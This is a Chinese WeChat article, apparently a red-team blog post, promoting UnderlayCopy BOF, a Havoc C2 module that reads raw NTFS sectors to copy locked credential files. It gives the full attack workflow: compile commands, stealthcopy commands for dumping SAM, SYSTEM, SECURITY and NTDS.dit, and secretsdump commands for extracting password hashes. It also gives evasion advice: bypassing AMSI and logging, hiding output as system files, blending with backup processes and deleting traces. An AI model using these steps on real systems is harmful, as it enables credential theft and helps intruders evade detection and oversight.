---
title: UnderlayCopy BOF：无依赖、低可检测性的敏感文件拷贝利器
url: https://mp.weixin.qq.com/s/zYq3DKocs8IOaHdzCaVH3g
source: Doonsec's feed
date: 2026-04-12
fetch_date: 2026-04-13T04:55:24.404839
---

# UnderlayCopy BOF：无依赖、低可检测性的敏感文件拷贝利器

![cover_image](http://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeicnQv160n7GJ0rPaURXKTPpFDPUdaQpEHCe3YsdOevctWqs5cXjNGQCPxHQeFWzgJZ1eNIgKUR435ElQGCicG0JRPfpfl95MNA/0?wx_fmt=jpeg)

# UnderlayCopy BOF：无依赖、低可检测性的敏感文件拷贝利器

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 本文介绍一款基于Havoc C2的BOF工具，它能直接读取NTFS磁盘扇区来复制锁定的系统文件，绕开传统VSS、注册表API等操作产生的日志痕迹，极大提升了隐蔽性。

## 01 工具概述：它能解决什么问题

做内网渗透时，我们经常需要获取Windows的关键文件，比如注册表hive文件（SAM， SYSTEM， SECURITY）或者域控上的NTDS.dit数据库。这些文件在系统运行时通常处于锁定状态。

常规做法是用Volume Shadow Copy（VSS）创建快照，或者调用RegSaveKey等高级API。但这些操作动静太大，会在系统日志里留下明显的记录，告警规则一抓一个准。

UnderlayCopy BOF的思路完全不同。它不跟文件系统“打招呼”，而是直接跟硬盘“对话”。工具通过解析NTFS的主文件表（MFT），计算出目标文件在物理磁盘上的真实位置，然后直接读取原始扇区数据，将内容写入一个新文件。

这种方式几乎可以绕过所有基于API调用和文件I/O的监控。它是对kfallahi原版UnderlayCopy PowerShell脚本的移植，消除了对PowerShell的依赖，让检测面变得更小。

## 02 核心工作原理：直接读取扇区数据

工具的运行流程可以概括为以下几步：

1. 通过NtAdjustPrivilegesToken，启用当前令牌的SeBackupPrivilege特权。
2. 通过GetFileInformationByHandle获取目标文件的MFT记录号。
3. 以同步只读方式打开卷设备，例如：\\.\C:。
4. 读取NTFS引导扇区，获取簇大小和$MFT文件的起始位置。
5. 读取$MFT文件的记录0（描述$MFT本身），解析其数据流，找到$MFT文件在磁盘上的实际物理位置，因为它是可以不连续存储的。
6. 根据上一步得到的映射，将目标文件的MFT记录号转换成逻辑簇号（LCN）。
7. 读取目标文件的完整MFT记录，解析其中的$DATA属性和数据流，找到文件内容所在的物理簇链。
8. 根据簇链，直接从磁盘读取原始簇数据，写入到目标输出文件中。

整个过程完全基于底层磁盘操作，不依赖文件系统的锁机制，因此能复制被系统独占打开的文件。

## 03 环境要求与文件结构

要运行这个工具，有几个前提条件：

* 本地管理员权限（需要提权）。工具不需要SYSTEM权限，普通提权后的管理员令牌默认就包含SeBackupPrivilege。
* 目标卷必须是NTFS格式，不支持FAT32或ReFS。
* 必须使用Havoc C2框架，因为它是一个Beacon Object File。

项目文件结构很简单：

UnderlayCopy\_bof/
├── Underlay\_bof.c      # BOF源代码
├── Underlay\_bof.py     # Havoc命令注册脚本
├── Makefile            # 用于mingw-w64交叉编译
├── beacon.h            # Havoc BOF API头文件
└── README.md

## 04 编译与使用

### 编译

在Linux环境下，使用mingw-w64进行交叉编译：

# 安装编译工具链
sudo apt install mingw-w64

# 编译
make clean && make

# 输出：Underlay\_bof.o

编译命令使用x86\_64-w64-mingw32-gcc，并采用几个关键参数来优化隐蔽性：-fno-asynchronous-unwind-tables去掉异常处理框架，-fno-ident移除编译器标识，-Os优化文件大小。

### 在Havoc中使用

首先，在Havoc的脚本管理器中加载Python脚本：

Script Manager → Load → Underlay\_bof.py

加载成功后，在Agent控制台就可以使用`stealthcopy`命令了。

### 使用示例

命令格式很简单：`stealthcopy <源文件> <目标文件>`。

# 转储本地账户哈希
stealthcopy C:\Windows\System32\config\SAM C:\Temp\out.sam
stealthcopy C:\Windows\System32\config\SYSTEM C:\Temp\out.system
stealthcopy C:\Windows\System32\config\SECURITY C:\Temp\out.security

# 转储Active Directory数据库（在域控制器上执行）
stealthcopy C:\Windows\NTDS\NTDS.dit C:\Temp\out.dit

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibc6ZZZCPtMcGwDOMkOWibJeSZvEzwdLEdLHEDtudAuichicQS0r8aM6FQD8l4iaEfKHeSgXfVG1qiaOH1iaKJcMeibByJo49vsEyyyGu8/640?wx_fmt=png&from=appmsg)

## 05 后续利用：提取哈希值

获取到文件后，就可以用Impacket套件里的secretsdump来提取哈希了。

# 提取本地用户哈希
secretsdump.py -sam out.sam -system out.system -security out.security LOCAL

# 提取域用户哈希（需要NTDS.dit和SYSTEM hive）
secretsdump.py -ntds out.dit -system out.system LOCAL

## 06 OPSEC对比：它到底有多隐蔽

我们可以把它和原版PowerShell脚本在操作安全性上做个比较。

* ✅ 绕过AMSI：BOF是原生代码执行，不触发反恶意软件扫描接口。
* ✅ 绕过脚本块日志记录：没有PowerShell，自然就没有EID 4104事件。
* ✅ 无PowerShell进程：减少了一个可疑的进程启动项。
* ✅ 绕过注册表API：两者都不需要调用RegSaveKey，避免相关日志。
* ⚠️ 原始卷读取（\\.\C:）：这个操作本身是比较底层的I/O，可能会被高级EDR标记为可疑行为，但通常比VSS或RegSaveKey要低调。
* ✅ 无需SYSTEM权限：普通提权的管理员权限即可。

坦白讲，直接读物理磁盘这个行为在某些监控严格的场景下也不是完全隐身的，但已经比标准方法好太多了。

## 07 实战建议与隐蔽技巧

工具好用，也得会用。这里有几个提升隐蔽性的小建议。

**目标路径选择：**别把输出文件放在太显眼的地方。

# 糟糕的选择
C:\Temp\SAM

# 更好的选择（伪装成系统文件）
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\random.tmp

**执行上下文：**如果你能从一个本身就负责备份操作的进程（比如一个以SYSTEM运行的备份代理服务）里运行这个BOF，那么其磁盘读取模式会和正常业务行为混在一起，难以区分。

**清理痕迹：**文件下传后，记得立刻删掉本地副本。

stealthcopy C:\Windows\System32\config\SAM C:\Temp\out.tmp
download C:\Temp\out.tmp
shell del /f C:\Temp\out.tmp

## 08 关于Credential Guard

需要明确一点，Credential Guard保护的是lsass.exe进程内存中的凭证，它通过虚拟化安全技术实现。UnderlayCopy BOF是直接从磁盘读取文件，完全不涉及内存操作，因此Credential Guard对此技术无效。

## 09 已知限制

没有完美的工具，UnderlayCopy BOF也有它的局限：

* 卷驱动器硬编码为C:盘。如果需要读取其他盘符，需要修改源代码中的`vol[]`数组。
* 不支持NTFS的备用数据流。
* 假设MFT记录大小为标准的1024字节。现代NTFS卷都是这个值，但理论上不排除有旧的非标准情况。
* 没有应用MFT记录末尾的更新序列数组修复。在实际测试中这通常没问题，但如果遇到碎片化特别严重的MFT记录，可能会导致读取失败。

## 10 总结

UnderlayCopy BOF提供了一种非常巧妙的方法来获取锁定的系统文件。它把攻击复杂度从应用层降到了物理存储层，从而规避了大量基于行为的检测。

它最适合需要高度隐蔽性的红队行动，尤其是在目标环境可能对VSS、PowerShell或特定API调用有严格监控的情况下。当然，它要求你先拿到Havoc框架的管理员权限会话。

如果你正在为如何悄无声息地拿走SAM或NTDS.dit而烦恼，这个工具值得一试。

---

**致谢**

**获取方式：私信回复"UnderlayCopy\_bof"获取**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

幻泉之洲

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过